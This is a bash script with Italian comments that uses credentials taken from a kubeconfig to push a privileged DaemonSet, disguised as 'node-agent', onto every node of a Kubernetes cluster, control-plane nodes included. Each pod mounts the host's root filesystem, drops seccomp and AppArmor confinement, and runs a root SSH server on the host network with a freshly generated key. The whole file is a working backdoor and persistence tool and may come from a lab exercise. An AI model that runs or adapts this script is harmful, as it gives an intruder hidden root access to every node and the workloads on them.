#!/usr/bin/env bash
set -euo pipefail

# === Parametri ===
KUBECONFIG_PATH="${KUBECONFIG_PATH:-$DATA_PATH/KC6/ops-admin.kubeconfig}"
NAMESPACE="${NAMESPACE:-kube-system}"
DS_NAME="${DS_NAME:-node-agent}"
IMAGE="${IMAGE:-alpine:3.20}"
CMD="${CMD:-/bin/sh -lc}"
ARGS="${ARGS:-echo \"hello from $(/bin/hostname)\"; while true; do sleep 60; done}"

apt update && apt install yq -y

# === Requisiti ===
for bin in yq jq base64; do
  command -v "$bin" >/dev/null 2>&1 || { echo "[-] Serve '$bin' nel PATH"; exit 1; }
done

# === Estrai endpoint & credenziali dal kubeconfig ===
APISERVER=$(yq -r '.clusters[0].cluster.server' "$KUBECONFIG_PATH")
CA_DATA=$(yq -r '.clusters[0].cluster."certificate-authority-data" // ""' "$KUBECONFIG_PATH")
INSECURE=$(yq -r '.clusters[0].cluster."insecure-skip-tls-verify" // "false"' "$KUBECONFIG_PATH")
TOKEN=$(yq -r '.users[0].user.token // ""' "$KUBECONFIG_PATH")
CERT_DATA=$(yq -r '.users[0].user."client-certificate-data" // ""' "$KUBECONFIG_PATH")
KEY_DATA=$(yq -r '.users[0].user."client-key-data" // ""' "$KUBECONFIG_PATH")
SA_NAME="${SA_NAME:-ops-admin}"
SSH_PORT="122"

KEY_DIR="$DATA_PATH/KC6/ssh"
KEY_NAME="ssh-key"
PRIV_KEY="${KEY_DIR}/${KEY_NAME}"
PUB_KEY="${PRIV_KEY}.pub"

mkdir -p ${KEY_DIR}
ssh-keygen -t ed25519 -N '' -f "${PRIV_KEY}" -C "ultra-priv" >/dev/null
AUTH_KEY="$(cat "${PUB_KEY}")"
echo "[i] Chiave generata: ${PRIV_KEY} / ${PUB_KEY}"

CURL_TLS=()
TMP_CA=""; TMP_CERT=""; TMP_KEY=""
if [[ -n "$CA_DATA" ]]; then
  TMP_CA=$(mktemp); echo "$CA_DATA" | base64 -d > "$TMP_CA"
  CURL_TLS+=(--cacert "$TMP_CA")
elif [[ "$INSECURE" == "true" ]]; then
  CURL_TLS+=(-k)
fi

AUTH=()
if [[ -n "$TOKEN" ]]; then
  AUTH=(-H "Authorization: Bearer ${TOKEN}")
elif [[ -n "$CERT_DATA" && -n "$KEY_DATA" ]]; then
  TMP_CERT=$(mktemp); echo "$CERT_DATA" | base64 -d > "$TMP_CERT"
  TMP_KEY=$(mktemp);  echo "$KEY_DATA"  | base64 -d > "$TMP_KEY"
  CURL_TLS+=(--cert "$TMP_CERT" --key "$TMP_KEY")
else
  echo "[-] Nessun token o client cert nel kubeconfig"; exit 1
fi

# === Assicura il namespace ===
NS_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
  "${APISERVER}/api/v1/namespaces/${NAMESPACE}" "${AUTH[@]}" "${CURL_TLS[@]}")
if [[ "$NS_CODE" == "404" ]]; then
  echo "[*] Creo namespace ${NAMESPACE}..."
  curl -sS -X POST "${APISERVER}/api/v1/namespaces" \
    "${AUTH[@]}" "${CURL_TLS[@]}" -H 'Content-Type: application/json' -d @- >/dev/null <<EOF
{ "apiVersion":"v1", "kind":"Namespace", "metadata":{ "name":"${NAMESPACE}" } }
EOF
fi

# === Server-side apply (create/update idempotente) ===
echo "[*] Applico DaemonSet ${DS_NAME} in ${NAMESPACE}..."
curl -sS -X PATCH \
  "${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE}/daemonsets/${DS_NAME}?fieldManager=curl&force=true" \
  "${AUTH[@]}" "${CURL_TLS[@]}" \
  -H 'Content-Type: application/apply-patch+yaml' \
  --data-binary @- >/dev/null <<EOF
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: ${DS_NAME}
  namespace: ${NAMESPACE}
spec:
  selector:
    matchLabels:
      app: ${DS_NAME}
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
  template:
    metadata:
      labels:
        app: ${DS_NAME}
      annotations:
        container.apparmor.security.beta.kubernetes.io/agent: unconfined
    spec:
      serviceAccountName: ${SA_NAME}
      hostNetwork: true
      hostPID: true
      hostIPC: true
      dnsPolicy: ClusterFirstWithHostNet
      tolerations:
        - key: "node-role.kubernetes.io/master"
          operator: "Exists"
          effect: "NoSchedule"
        - key: "node-role.kubernetes.io/control-plane"
          operator: "Exists"
          effect: "NoSchedule"
      priorityClassName: system-node-critical
      terminationGracePeriodSeconds: 10
      containers:
        - name: agent
          image: ${IMAGE}
          command: ["/bin/sh","-lc"]
          args:
            - |
              set -e
              apk add --no-cache openssh bash curl jq iproute2 iptables psmisc procps cronie ca-certificates containerd unzip
              mkdir -p /etc/ssh /run/sshd
              ssh-keygen -A
              mkdir -p /root/.ssh
              printf "%s\n" "$AUTH_KEY" > /root/.ssh/authorized_keys
              chmod 700 /root/.ssh
              chmod 600 /root/.ssh/authorized_keys
              mkdir -p /etc/ssh/sshd_config.d
              cat >/etc/ssh/sshd_config.d/99-runtime.conf <<'EOF'
              PasswordAuthentication no
              PubkeyAuthentication yes
              PermitRootLogin prohibit-password
              UseDNS no
              EOF
              exec /usr/sbin/sshd -D -e -p ${SSH_PORT}
          env:
            - name: AUTH_KEY
              value: "${AUTH_KEY}"
            - name: SSH_PORT
              value: "${SSH_PORT:-122}"
          ports:
            - name: ssh
              containerPort: ${SSH_PORT}   # solo metadata; con hostNetwork si lega direttamente sull'host
          securityContext:
            privileged: true
            allowPrivilegeEscalation: true
            readOnlyRootFilesystem: false
            runAsNonRoot: false
            runAsUser: 0
            capabilities:
              add: ["ALL"]
            seccompProfile:
              type: Unconfined
          volumeMounts:
            # Root filesystem host
            - name: rootfs
              mountPath: /host
              mountPropagation: HostToContainer
      volumes:
        - name: rootfs
          hostPath: { path: /, type: Directory }
EOF

# === Verifica: elenca i Pod creati dal DaemonSet ===
echo "[*] Pod risultanti:"
PODS=$(curl -sS "${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods?labelSelector=app=${DS_NAME}" \
  "${AUTH[@]}" "${CURL_TLS[@]}")
echo "$PODS" | jq -r '.items[] | [.metadata.name, .spec.nodeName, .status.phase] | @tsv' \
  || echo "(nessun pod ancora schedulato)"

# === Cleanup temporanei ===
[[ -n "$TMP_CA" ]]   && rm -f "$TMP_CA"
[[ -n "$TMP_CERT" ]] && rm -f "$TMP_CERT" "$TMP_KEY"

echo "[+] Fatto."
echo "    Per cancellare: curl -X DELETE \"${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE}/daemonsets/${DS_NAME}\" ${AUTH:+-H 'Authorization: Bearer ***'} ..."
